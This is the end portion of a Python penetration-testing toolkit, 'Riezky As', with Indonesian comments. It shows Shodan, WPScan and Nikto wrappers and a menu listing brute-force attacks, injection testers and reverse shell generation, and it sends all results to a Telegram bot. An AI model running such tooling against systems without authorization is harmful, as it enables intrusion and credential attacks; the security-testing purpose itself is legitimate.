    """Menginstal semua dependensi yang diperlukan"""
    console.print("[yellow]⏳ Installing all dependencies...[/yellow]")

    dependencies = [
        ("python3-pip", "sudo apt install python3-pip -y"),
        ("git", "sudo apt install git -y"),
        ("golang", "sudo apt install golang -y"),
        ("whois", "sudo apt install whois -y"),
        ("nmap", "sudo apt install nmap -y"),
        ("dnsutils", "sudo apt install dnsutils -y"),
        ("traceroute", "sudo apt install traceroute -y")
    ]

    results = []
    for tool, cmd in dependencies:
        if not check_tool(tool.split()[0]):
            results.append(f"Installing {tool}...")
            if install_tool(tool, cmd):
                results.append(f"[green]✓ {tool} installed[/green]")
            else:
                results.append(f"[red]✗ Failed to install {tool}[/red]")
        else:
            results.append(f"[green]✓ {tool} already installed[/green]")

    console.print(Panel.fit("\n".join(results), title="Dependency Installation", style="cyan"))
    telegram_msg = f"<b>⚙️ DEPENDENCY INSTALLATION</b>\n<pre>{clean_ansi_codes('\n'.join(results))}</pre>"
    send_to_telegram(telegram_msg)

def about():
    """Menampilkan informasi tentang toolkit"""
    about_text = f"""
    Riezky As {VERSION}
    {LAST_UPDATE}

    [bold]Created by:[/bold] Rizky Hacker
    [bold]Contact:[/bold] @RizkySec

    [bold]Integrated Tools:[/bold]
      • Nmap
      • GoBuster
      • WhatWeb
      • Nuclei
      • Wafw00f
      • theHarvester
      • SubFinder
      • httpx
      • testssl.sh
      • Hydra
      • +30 custom modules

    [bold]Features:[/bold]
      • Comprehensive network scanning
      • Web application testing
      • Vulnerability assessment
      • Brute force attacks
      • Malware scanning
      • Reverse shell generation
      • Automated reporting to Telegram
      • Real-time progress monitoring

    [bold]Repository:[/bold] {REPO_URL}
    [bold]Disclaimer:[/bold] For authorized security testing only
    """

    console.print(Panel.fit(about_text, title="About Riezky As", style="blue"))
    send_to_telegram(f"<b>ℹ️ ABOUT RIEZKY AS {VERSION}</b>\n{about_text}")

# =========================================
# NEW FEATURES
# =========================================

def shodan_search(target):
    """Mencari informasi target menggunakan Shodan API"""
    SHODAN_API_KEY = os.getenv("SHODAN_API_KEY", "")
    
    if not SHODAN_API_KEY:
        console.print("[red]Shodan API key not set! Set SHODAN_API_KEY environment variable.[/red]")
        return
        
    console.print(f"[yellow]⏳ Searching Shodan for {target}...[/yellow]")
    
    try:
        url = f"https://api.shodan.io/shodan/host/{target}?key={SHODAN_API_KEY}"
        response = requests.get(url, timeout=10)
        data = response.json()
        
        if 'error' in data:
            console.print(f"[red]Shodan error: {data['error']}[/red]")
            return
            
        results = [
            f"IP: {data.get('ip_str', 'N/A')}",
            f"Organization: {data.get('org', 'N/A')}",
            f"Operating System: {data.get('os', 'N/A')}",
            f"Country: {data.get('country_name', 'N/A')}",
            f"City: {data.get('city', 'N/A')}",
            f"Last Update: {data.get('last_update', 'N/A')}",
            f"Hostnames: {', '.join(data.get('hostnames', []))}",
            f"Ports: {', '.join(str(p) for p in data.get('ports', []))}",
            "\n[bold]Vulnerabilities:[/bold]"
        ]
        
        vulns = data.get('vulns', [])
        for vuln in vulns:
            results.append(f"• {vuln}")
            
        console.print(Panel.fit("\n".join(results), title="Shodan Results", style="green"))
        telegram_msg = f"<b>🔍 SHODAN RESULTS FOR {target}</b>\n<pre>{clean_ansi_codes('\n'.join(results))}</pre>"
        send_to_telegram(telegram_msg)
    except Exception as e:
        console.print(f"[red]Error: {str(e)}[/red]")

def wpscan_analysis(target):
    """Melakukan scan WordPress menggunakan WPScan"""
    if not ensure_tool("wpscan", "sudo apt install wpscan -y"):
        return
        
    console.print(f"[yellow]⏳ Scanning WordPress site at {target}...[/yellow]")
    
    output_file = f"wpscan_{target.replace('.', '_')}.txt"
    command = ["wpscan", "--url", target, "--output", output_file, "--format", "txt"]
    
    try:
        start_time = time.time()
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        # Live output processing
        while True:
            output = process.stdout.readline()
            if output == '' and process.poll() is not None:
                break
            if output:
                console.print(output.strip())
                
        stderr = process.stderr.read()
        if stderr:
            console.print(f"[red]{stderr}[/red]")
            
        end_time = time.time()
        duration = end_time - start_time
        
        if os.path.exists(output_file):
            with open(output_file, 'r') as f:
                output = f.read()
                
            console.print(Panel.fit(output, title="WPScan Results", style="green"))
            telegram_msg = f"<b>📝 WPSCAN RESULTS FOR {target}</b>\n<pre>{clean_ansi_codes(output)}</pre>"
            send_to_telegram(telegram_msg)
            send_file_to_telegram(output_file, f"WPScan results for {target}")
        else:
            console.print("[red]WPScan output file not found[/red]")
    except Exception as e:
        console.print(f"[red]Error: {str(e)}[/red]")

def nikto_scan(target):
    """Melakukan scan web server menggunakan Nikto"""
    if not ensure_tool("nikto", "sudo apt install nikto -y"):
        return
        
    console.print(f"[yellow]⏳ Scanning web server at {target}...[/yellow]")
    
    output_file = f"nikto_{target.replace('.', '_')}.txt"
    command = ["nikto", "-h", target, "-output", output_file]
    
    try:
        start_time = time.time()
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        # Live output processing
        while True:
            output = process.stdout.readline()
            if output == '' and process.poll() is not None:
                break
            if output:
                console.print(output.strip())
                
        stderr = process.stderr.read()
        if stderr:
            console.print(f"[red]{stderr}[/red]")
            
        end_time = time.time()
        duration = end_time - start_time
        
        if os.path.exists(output_file):
            with open(output_file, 'r') as f:
                output = f.read()
                
            console.print(Panel.fit(output, title="Nikto Results", style="green"))
            telegram_msg = f"<b>🛡️ NIKTO SCAN FOR {target}</b>\n<pre>{clean_ansi_codes(output)}</pre>"
            send_to_telegram(telegram_msg)
            send_file_to_telegram(output_file, f"Nikto results for {target}")
        else:
            console.print("[red]Nikto output file not found[/red]")
    except Exception as e:
        console.print(f"[red]Error: {str(e)}[/red]")

# =========================================
# MAIN MENU AND EXECUTION
# =========================================

def main_menu():
    banner()

    while True:
        console.print("\n[bold cyan]Riezky As Main Menu[/bold cyan]")
        console.print("="*60)
        console.print("[bold yellow]RECONNAISSANCE[/bold yellow]")
        console.print(" 1. WHOIS Lookup - Informasi registrasi domain")
        console.print(" 2. DNS Lookup - Catatan DNS domain")
        console.print(" 3. Reverse IP Lookup - Domain di IP yang sama")
        console.print(" 4. GeoIP Lookup - Informasi geografis IP")
        console.print(" 5. Email Harvester - Kumpulkan email terkait domain")
        console.print(" 6. User Recon - Cari username di sosial media")
        console.print(" 7. Subdomain Enum - Temukan subdomain terkait domain")

        console.print("\n[bold yellow]NETWORK SCANNING[/bold yellow]")
        console.print(" 8. Nmap Scan - Pemindaian port dan layanan")
        console.print(" 9. Port Scanner - Pemindaian port cepat")
        console.print("10. Traceroute - Lacak rute jaringan")
        console.print("11. Subnet Lookup - Analisis informasi subnet")

        console.print("\n[bold yellow]WEB APPLICATION[/bold yellow]")
        console.print("12. WhatWeb Scan - Identifikasi teknologi web")
        console.print("13. Gobuster Scan - Cari direktori dan file tersembunyi")
        console.print("14. WAF Detection - Deteksi Web Application Firewall")
        console.print("15. Nuclei Vulnerability Scan - Pemindaian kerentanan")
        console.print("16. HTTP Header Analysis - Analisis header keamanan")
        console.print("17. robots.txt Scanner - Periksa isi robots.txt")
        console.print("18. Zone Transfer Check - Periksa kerentanan DNS")
        console.print("19. SSL/TLS Scanner - Periksa konfigurasi SSL/TLS")
        console.print("20. Login Page Finder - Cari halaman login/admin")
        console.print("21. File Upload Tester - Uji kerentanan unggah file")
        console.print("22. Injection Tester - Uji XSS/SQLi/Command Injection")
        console.print("23. File Inclusion Tester - Uji LFI/RFI/Path Traversal")

        console.print("\n[bold yellow]BRUTE FORCE & EXPLOITATION[/bold yellow]")
        console.print("24. Brute Force Attack - FTP/SSH/HTTP/WordPress/cPanel")
        console.print("25. Webshell Detector - Cari backdoor di website")
        console.print("26. CVE Scanner - Log4Shell & kerentanan kritis")
        console.print("27. Generate Reverse Shell - Buat payload reverse shell")

        console.print("\n[bold yellow]DEFENSIVE TOOLS[/bold yellow]")
        console.print("28. Malware Scanner - Cek file dengan VirusTotal")
        console.print("29. Traffic Monitor - Pantau koneksi jaringan")

        console.print("\n[bold yellow]NEW FEATURES[/bold yellow]")
        console.print("30. Shodan Search - Cari informasi target di Shodan")
        console.print("31. WPScan Analysis - Scan WordPress vulnerabilities")
        console.print("32. Nikto Scan - Web server vulnerability scanner")
        
        console.print("\n[bold yellow]UTILITIES[/bold yellow]")
        console.print("33. Update Toolkit - Perbarui toolkit dan dependensi")
        console.print("34. Install Dependencies - Instal semua dependensi")
        console.print("35. About - Informasi tentang toolkit")
        console.print(" 0. Exit - Keluar dari aplikasi")
        console.print("="*60)

        choice = console.input("[bold green]Select option (0-35): [/]").strip()

        mode = "cepat"
        if choice in ["8", "9", "13", "15", "24"]:
            mode_choice = console.input("[bold green]Select mode (cepat/lengkap): [/]").strip().lower()
            if mode_choice in ["cepat", "lengkap"]:
                mode = mode_choice

        try:
            if choice == "1":
                target = console.input("[bold green]Enter domain: [/]").strip()
                whois_lookup(target, mode)
            elif choice == "2":
                target = console.input("[bold green]Enter domain: [/]").strip()
                dns_lookup(target, mode)
            elif choice == "3":
                target = console.input("[bold green]Enter IP: [/]").strip()
                reverse_ip_lookup(target)
            elif choice == "4":
                target = console.input("[bold green]Enter IP: [/]").strip()
                geoip_lookup(target)
            elif choice == "5":
                target = console.input("[bold green]Enter domain: [/]").strip()
                email_harvester(target, mode)
            elif choice == "6":
                username = console.input("[bold green]Enter username: [/]").strip()
                userrecon_scan(username, mode)
            elif choice == "7":
                target = console.input("[bold green]Enter domain: [/]").strip()
                subdomain_enum(target, mode)
            elif choice == "8":
                target = console.input("[bold green]Enter IP/Domain: [/]").strip()
                nmap_scan(target, mode)
            elif choice == "9":
                target = console.input("[bold green]Enter IP/Domain: [/]").strip()
                port_scanner(target, mode)
            elif choice == "10":
                target = console.input("[bold green]Enter IP/Domain: [/]").strip()
                traceroute(target, mode)
            elif choice == "11":
                target = console.input("[bold green]Enter IP/CIDR (e.g., 192.168.1.0/24): [/]").strip()
                subnet_lookup(target)
            elif choice == "12":
                target = console.input("[bold green]Enter URL: [/]").strip()
                whatweb_scan(target, mode)
            elif choice == "13":
                target = console.input("[bold green]Enter URL: [/]").strip()
                gobuster_scan(target, mode)
            elif choice == "14":
                target = console.input("[bold green]Enter URL: [/]").strip()
                waf_detection(target, mode)
            elif choice == "15":
                target = console.input("[bold red]Enter URL: [/]").strip()
                nuclei_scan(target, mode)
            elif choice == "16":
                target = console.input("[bold green]Enter URL: [/]").strip()
                http_header_analysis(target)
            elif choice == "17":
                target = console.input("[bold green]Enter domain: [/]").strip()
                robots_txt_scanner(target)
            elif choice == "18":
                target = console.input("[bold green]Enter domain: [/]").strip()
                zone_transfer_check(target)
            elif choice == "19":
                target = console.input("[bold green]Enter domain: [/]").strip()
                ssl_tls_scan(target)
            elif choice == "20":
                target = console.input("[bold green]Enter domain: [/]").strip()
                find_login_pages(target, mode)
            elif choice == "21":
                target = console.input("[bold green]Enter domain: [/]").strip()
                check_file_upload(target)
            elif choice == "22":
                target = console.input("[bold green]Enter URL: [/]").strip()
                injection_tester(target)
            elif choice == "23":
                target = console.input("[bold green]Enter URL: [/]").strip()
                check_file_inclusion(target)
            elif choice == "24":
                target = console.input("[bold green]Enter target (IP/Domain): [/]").strip()
                service = console.input("[bold green]Enter service (ftp/ssh/http-form/wordpress/cpanel): [/]").strip()
                username = None
                if service != "http-form":
                    username = console.input("[bold green]Enter username (or leave blank for user list): [/]").strip() or None
                brute_force_attack(target, service, username, mode)
            elif choice == "25":
                target = console.input("[bold green]Enter domain: [/]").strip()
                detect_webshells(target)
            elif choice == "26":
                target = console.input("[bold green]Enter URL: [/]").strip()
                cve_scanner(target)
            elif choice == "27":
                generate_reverse_shell()
            elif choice == "28":
                file_path = console.input("[bold green]Enter file path: [/]").strip()
                malware_scan(file_path)
            elif choice == "29":
                duration = console.input("[bold green]Enter duration in seconds: [/]").strip() or "30"
                monitor_traffic(int(duration))
            elif choice == "30":
                target = console.input("[bold green]Enter IP/Domain: [/]").strip()
                shodan_search(target)
            elif choice == "31":
                target = console.input("[bold green]Enter WordPress URL: [/]").strip()
                wpscan_analysis(target)
            elif choice == "32":
                target = console.input("[bold green]Enter URL: [/]").strip()
                nikto_scan(target)
            elif choice == "33":
                update_toolkit()
            elif choice == "34":
                install_dependencies()
            elif choice == "35":
                about()
            elif choice == "0":
                console.print(Panel.fit("[bold red]Exiting Riezky As...[/bold red]", title="Goodbye", style="red"))
                send_to_telegram("🔴 <b>RIEZKY AS SESSION ENDED</b>")
                break
            else:
                console.print(Panel.fit("[bold red]Invalid option! Try again.[/bold red]", style="red"))
        except Exception as e:
            console.print(f"[bold red]Error during operation: {str(e)}[/bold red]")
            send_to_telegram(f"⚠️ <b>OPERATION ERROR</b>\n{str(e)}")

        console.input("\n[bold yellow]Press Enter to continue...[/]")

if __name__ == "__main__":
    try:
        # Setup environment
        os.makedirs(os.path.expanduser("~/.wordlists"), exist_ok=True)
        os.makedirs(os.path.expanduser("~/.nuclei-templates"), exist_ok=True)

        # Send startup notification
        send_to_telegram(f"🟢 <b>RIEZKY AS {VERSION} STARTED</b>\nSystem: {sys.platform}\nPython: {sys.version.split()[0]}")

        main_menu()
    except KeyboardInterrupt:
        console.print("\n[bold red]Program terminated by user![/bold red]")
        send_to_telegram("⛔ <b>RIEZKY AS TERMINATED BY USER!</b>")
    except Exception as e:
        console.print(f"[bold red]Critical error: {str(e)}[/bold red]")
        send_to_telegram(f"🚨 <b>RIEZKY AS CRASHED</b>\nError: {str(e)}")
        sys.exit(1)